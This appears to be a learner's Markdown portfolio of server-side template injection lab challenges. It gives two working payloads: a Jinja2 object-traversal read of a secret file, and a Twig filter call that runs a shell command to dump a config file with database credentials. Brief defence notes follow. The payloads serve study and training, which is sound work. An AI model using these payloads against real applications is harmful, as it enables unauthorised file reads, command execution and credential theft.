# Server-Side Template Injection (SSTI) - Mastery Portfolio

## 📊 Skills Validated
- **Template Engine Identification**: Flask/Jinja2, Twig, Smarty detection
- **Context-Aware Payload Development**: Crafting engine-specific exploits
- **Object Chain Traversal**: Navigating Python/Ruby/PHP class hierarchies
- **Impact Assessment**: File read, RCE, credential disclosure

## 🔬 Completed SSTI Challenges

### 1. Flask/Jinja2 SSTI - invoicepanel.hv
**Vulnerability**: `name` parameter in `POST /create_invoice`
**Payload**: `{{ get_flashed_messages.__globals__.__builtins__.open('/home/secret.txt').read() }}`
**Impact**: Arbitrary file read via template code execution
**Skills**: Python object traversal, Jinja2 sandbox escape

### 2. Twig SSTI - true-scream.apac01.hackviser.space  
**Vulnerability**: `q` parameter in search function
**Payload**: `{{['cat /var/www/html/config.php']|filter('system')}}`
**Impact**: Remote code execution → database credential exposure
**Skills**: Twig filter exploitation, system command injection

## 🛡️ Defense Strategies Mastered
1. **Input Sanitization**: Context-aware escaping for template variables
2. **Sandbox Configuration**: Restricting template engine capabilities
3. **Allow-Listing**: Permitting only safe template functions/filters
4. **Content Security Policy**: Limiting script execution contexts

## 📈 Real-World Application
These skills directly translate to:
- **Bug Bounty Hunting**: Identifying SSTI in modern web frameworks
- **Penetration Testing**: Template injection in CI/CD pipelines, admin panels
- **Code Review**: Auditing template usage in Django, Flask, Express applications

*All exercises conducted in controlled, authorized environments.*
